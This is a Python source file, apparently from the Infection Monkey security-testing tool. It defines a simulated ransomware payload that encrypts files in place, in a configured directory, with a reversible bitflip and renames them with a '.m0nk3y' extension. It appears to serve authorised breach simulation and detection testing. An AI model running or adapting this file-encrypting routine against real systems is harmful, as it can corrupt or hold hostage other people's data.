import logging
from pathlib import Path
from typing import List, Optional, Tuple

from infection_monkey.ransomware.bitflip_encryptor import BitflipEncryptor
from infection_monkey.ransomware.file_selectors import select_production_safe_target_files
from infection_monkey.ransomware.valid_file_extensions import VALID_FILE_EXTENSIONS_FOR_ENCRYPTION
from infection_monkey.utils.environment import is_windows_os

LOG = logging.getLogger(__name__)

EXTENSION = ".m0nk3y"
CHUNK_SIZE = 4096 * 24


class RansomewarePayload:
    def __init__(self, config: dict):
        LOG.info(f"Windows dir configured for encryption is \"{config['windows_dir']}\"")
        LOG.info(f"Linux dir configured for encryption is \"{config['linux_dir']}\"")

        self._target_dir = config["windows_dir"] if is_windows_os() else config["linux_dir"]

        self._new_file_extension = EXTENSION
        self._valid_file_extensions_for_encryption = VALID_FILE_EXTENSIONS_FOR_ENCRYPTION.copy()
        self._valid_file_extensions_for_encryption.discard(self._new_file_extension)

        self._encryptor = BitflipEncryptor(chunk_size=CHUNK_SIZE)

    def run_payload(self):
        file_list = self._find_files()
        self._encrypt_files(file_list)

    def _find_files(self) -> List[Path]:
        if not self._target_dir:
            return []

        return select_production_safe_target_files(
            Path(self._target_dir), self._valid_file_extensions_for_encryption
        )

    def _encrypt_files(self, file_list: List[Path]) -> List[Tuple[Path, Optional[Exception]]]:
        results = []
        for filepath in file_list:
            try:
                self._encryptor.encrypt_file_in_place(filepath)
                self._add_extension(filepath)
                results.append((filepath, None))
            except Exception as ex:
                results.append((filepath, ex))

        return results

    def _add_extension(self, filepath: Path):
        new_filepath = filepath.with_suffix(f"{filepath.suffix}{self._new_file_extension}")
        filepath.rename(new_filepath)
